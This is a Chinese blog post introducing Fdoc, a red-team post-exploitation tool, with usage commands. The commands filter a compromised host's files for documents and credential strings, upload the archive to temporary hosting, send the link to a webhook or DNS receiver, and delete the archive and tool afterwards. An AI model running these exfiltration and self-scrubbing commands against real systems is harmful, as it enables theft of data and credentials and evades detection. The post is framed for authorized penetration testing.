---
title: "Fdoc：条件打包、上传外带与回传"
date: 2026-07-21T10:25:00+08:00
draft: false
description: "在短时会话约束下，按后缀、文件名、关键字与日期筛选文件，流式打包并可选加密上传与 webhook/DNS 回传。"
categories: ["安全"]
tags: ["red-team", "post-exploitation", "fdoc", "exfiltration", "file-transfer"]
featuredImage: "/images/posts/fdoc-conditional-pack-exfil/featured.jpg"
featuredImagePreview: "/images/posts/fdoc-conditional-pack-exfil/featured.jpg"
lightgallery: true
toc:
  enable: true
  auto: true
---

拿到一台机器（或一段短暂的 shell）时，目标很少是「把磁盘原样镜像走」。更常见的是按条件筛一批文件、打成可控体积的包，再尽快带回操作侧。

<!--more-->

{{< admonition warning "合规声明" >}}
仅供授权渗透测试、应急响应与研究使用。请勿用于未授权系统。
{{< /admonition >}}

## 1. 使用场景

更具体的需求通常包括：

- **类型筛选**：只要特定类型——合同/报表 PDF、Office、配置、压缩包、近期改过的文档
- **条件叠加**：文件名带 密码/密码本、内容命中凭证写法（可用 `-keyword secrets`）、mtime 在某天之后
- **体积与时间受限**：不能无脑打包几十 GB，也不能在目标上挂太久
- **结果回传**：包打完还不够——文件在目标机上，如何把**下载链接**带回操作侧；父进程/C2 断了也要避免无法取回结果
- **痕迹控制**：传完尽量不把归档和工具本身留在盘上

一个很具体的打法：**刚拿到初始权限，先做一轮短时信息收集**——用后缀/文件名/关键字把敏感配置、文档、表格、源码筛进包，外带回本地再审计。包里常见内网拓扑/地图、密码本、凭证表、运维手册之类，够支撑后续横向，而不是在目标机上慢慢翻盘。

红队外带、应急里抽关键证据、运维「只捞某目录某类文件」——本质都是**选择性外带**，不是备份，也不是全盘取证。

[Fdoc](https://github.com/simonlee-hello/Fdoc) 就是按这个场景做的：在目标上筛、打包、（可选）传、（可选）把链接回传到接收端、（可选）清理。

## 2. 解决什么痛点

| 痛点                                          | Fdoc 怎么对上                                                |
| --------------------------------------------- | ------------------------------------------------------------ |
| 整盘/整目录打包又慢又大，真正有用的只占一小撮 | 后缀/文件名/内容/日期组合过滤 + 默认 documents；凭证可用 `-keyword secrets` |
| 先扫完全部路径再压，大目录内存和耗时难看      | 流式 Walk + 写 tgz                                           |
| 包在目标机上，会话一断链接拿不回来            | webhook / DNS 回传，和 C2 生命周期解耦                       |
| 临时托管哪个能用、体积限制各不相同            | 按大小 auto probe + failover，也可指定渠道                   |
| 明文归档直接上传不放心                        | 可选加密                                                     |
| 传完还想少留工具和包                          | 可选 scrub；失败可观测（exit / `SCRUB_PARTIAL`）             |
| 工具链拆太碎（打包器 + 上传器 + 解密器）      | 一个二进制覆盖打包 / 上传 / 解密 / 渠道表                    |

一句话：

**在「只能短时间待在目标上、又只要部分文件、还得把结果弄回家」的约束下，Fdoc 把筛选、打包、外带和回传收成一条可脚本化的命令链。**

## 3. 大致逻辑

一条主链路：

**解析参数 → 从 `-d` Walk → 按规则过滤 → 流式写入 `.tgz` →（可选）加密并上传临时托管 →（可选）webhook/DNS 回传 URL →（可选）scrub**

对每个文件，过滤是固定顺序的「且」条件链（未配置的项视为通过）：

跳过 `-x` 目录 → 普通文件或可跟随的文件 symlink → `-e` 后缀 → `-f` 文件名 → `-t` 日期 → `-k`/`-keyword` 内容 → `-max-file` → 是否触达 `-max` 总大小。

同一参数里逗号是「或」。例如：`-e pdf -f invoice -t 2024-01-01` 表示三者同时满足；`-keyword password:,token:` 表示内容命中其一即可。也可用预设：`-keyword secrets`（别名 `creds`）展开为赋值/JSON 凭证子串。条件细则与预设表见 [4.1 多条件筛选文件](#41-多条件筛选文件)。

体积与退出行为：

- **默认软上限**：总预算按逻辑大小记账，默认 1GB；单文件 `-max-file` 默认关闭（`0`）
- **未显式传 `-max`**：触达总预算时直接失败（exit 1），并提示显式加上（或 `-max 0` 关闭），避免静默截断
- **显式传了 `-max`**：截断并保留已打部分（退出码 2）；若开了上传，残包仍可能被传上去——方便「先带走能带走的」
- **超大单文件**：需要跳过时再显式加 `-max-file`

{{< admonition tip "先估再打" >}}
不清楚会匹配多大时，建议先跑 `-size`（只统计、不打包），看磁盘占用与逻辑大小，再决定是否打包或加 `-max`。
{{< /admonition >}}

不加 `-upload` 时只本地打包，不联网。加了之后才走探测渠道、上传和回传。

## 4. 特色功能

### 4.1 多条件筛选文件

可按后缀、文件名、内容、日期、跳过目录等收窄目标集；条件之间为「且」、同参逗号为「或」，规则见 [3. 大致逻辑](#3-大致逻辑)。

| 条件       | 参数              | 说明                                                         |
| ---------- | ----------------- | ------------------------------------------------------------ |
| 后缀       | `-e`              | 扩展名过滤；可写 `pdf,docx`，也可用预设少打字                |
| 文件名     | `-f`              | 路径名模糊包含（如 `invoice,secret`）                        |
| 内容关键字 | `-k` / `-keyword` | 在文件内容里搜（跳过明显二进制；单文件最多扫约 8MB）。字面量逗号=或；预设 `secrets`/`creds` 展开为 `password=`、`"password":` 等赋值/JSON 变体，可混用字面量 |
| 修改时间   | `-t`              | 只收该日及之后改过的（`YYYY-MM-DD`）                         |
| 跳过目录   | `-x`              | 默认有各 OS 缓存/垃圾目录列表；显式传 `-x` 会整表覆盖        |

`-e` 预设：

| 取值                | 含义                                            |
| ------------------- | ----------------------------------------------- |
| `documents`（默认） | pdf/doc/xls/ppt/csv                             |
| `all`               | 常见文档 + 压缩包 + config（仍不是磁盘上任意文件） |
| `any`               | 不限后缀                                        |
| `pdf,txt,...`       | 显式列表                                        |

`-keyword` 预设：

| 取值                | 含义                                                         |
| ------------------- | ------------------------------------------------------------ |
| `secrets` / `creds` | 凭证赋值/JSON 子串（`password:`、`password =`、`"password":`、`api_key=`、`密码：` 等）；可写 `-keyword secrets,corp_sso=` |

示例：

```bash
Fdoc -d /data -e pdf -f invoice -keyword 'token:' -t 2025-01-01 -o hits.tgz
Fdoc -d /data -e ini,conf,json,yml -keyword secrets -o creds.tgz
```

关于链接：Unix/macOS **文件符号链接会跟随**（内容取目标，入包名用链接路径）；目录 symlink 不进入。Windows `.lnk` 不解析目标，仅当 `-e` 命中时打包快捷方式文件本身。

### 4.2 边扫边打，带体积预算

不先罗列再压缩，内存占用可控。`-size` 可先估再打。长任务有 `PACK_PROGRESS` / `UPLOAD_PROGRESS` 心跳，适合无头环境。

### 4.3 内嵌上传：按体积自动选临时渠道

`-upload` 后按归档大小筛渠道、并行探测、按延迟 failover；也可用 `-b` 钉死某一渠道（演示里常见如 `-b lit`）。完整渠道名与体积阈值以 `Fdoc backends` 输出为准。无回传时 URL 打在 stdout，脚本好接；状态行在 stderr（`UPLOAD_OK` 等）。

### 4.4 回传与会话解耦

配 `-webhook` / `-dns` 时，下载链接推到接收端：HTTPS webhook 优先，失败再用 DNSLog 分片。父会话挂了，仍可能从回传里捞 URL。stdout/stderr 分工固定，避免脚本和人工抢输出。

### 4.5 上传前加密（可选）

`-encrypt -key`：AES-256-CBC，线格式带 `UP01` 魔数；远端统一 `.bin`，避免当成普通 gzip 解。内置 `Fdoc decrypt`，不必再带第二套工具。密钥是口令 pad 到 32 字节（不是 PBKDF2），按共享口令模型用即可。

### 4.6 可选收尾 scrub

上传成功（若配了回传则还要回传成功）后删归档和自身。Windows 上自删是 best-effort（延迟删 / 重启删），失败会 `SCRUB_PARTIAL` 并以非 0 退出。

### 4.7 跨平台静态二进制

发行物为无依赖静态单文件，覆盖 Linux / Windows / macOS（含 amd64 与 arm64）。同一套参数在各平台可用；Windows 上 scrub、SkipDirs、`.lnk` 行为见上文与发行说明。

## 5. 最小示例

```bash
# 不清楚体积时先估大小
Fdoc -d /data -e documents -size

# 打包
Fdoc -d /data -e documents -max 500MB -o /tmp/docs.tgz

# 配置/JSON 里捞凭证写法
Fdoc -d /data -e ini,conf,json,yml -keyword secrets -o /tmp/creds.tgz

# 上传，链接打到 stdout
Fdoc -d /data -o /tmp/docs.tgz -upload -q

# 加密上传 + webhook 回传 + 清理
Fdoc -d /data -e pdf,docx -t 2025-01-01 -o /tmp/docs.tgz \
  -upload -encrypt -key "$KEY" \
  -webhook https://your.receiver/hook \
  -scrub -q
```

DNS 分片格式、加密磁盘占用、Windows SkipDirs 等细节见 [Fdoc 仓库 README](https://github.com/simonlee-hello/Fdoc)。

## 6. 终端演示

下面四段演示覆盖主路径：估大小 → 多条件筛选打包 → 指定渠道上传 → 上传并 webhook 回传。

{{< image src="/images/posts/fdoc-conditional-pack-exfil/01-size.gif" caption="估大小（`-size`）" >}}

{{< image src="/images/posts/fdoc-conditional-pack-exfil/02-filter-pack.gif" caption="多条件筛选后打包" >}}

{{< image src="/images/posts/fdoc-conditional-pack-exfil/03-upload.gif" caption="上传（`-b lit`）" >}}

{{< image src="/images/posts/fdoc-conditional-pack-exfil/04-upload-webhook.gif" caption="上传 + webhook 回传" >}}
